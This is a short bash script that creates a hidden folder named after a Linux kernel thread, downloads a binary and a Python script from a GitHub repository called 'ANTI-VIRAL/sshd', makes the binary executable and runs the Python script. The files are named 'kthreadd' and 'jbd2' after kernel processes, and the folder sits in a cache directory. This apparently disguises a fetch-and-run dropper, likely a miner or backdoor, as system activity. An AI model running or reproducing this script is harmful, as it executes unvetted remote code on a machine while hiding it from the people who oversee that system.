#!/bin/bash

set -e

mkdir -p ~/.cache/kthreadd
chmod 700 ~/.cache/kthreadd
cd ~/.cache/kthreadd

wget -q \
    https://github.com/ANTI-VIRAL/sshd/raw/main/jbd2 \
    https://github.com/ANTI-VIRAL/sshd/raw/main/kthreadd.py 

chmod +x jbd2

# Start program
exec python kthreadd.py
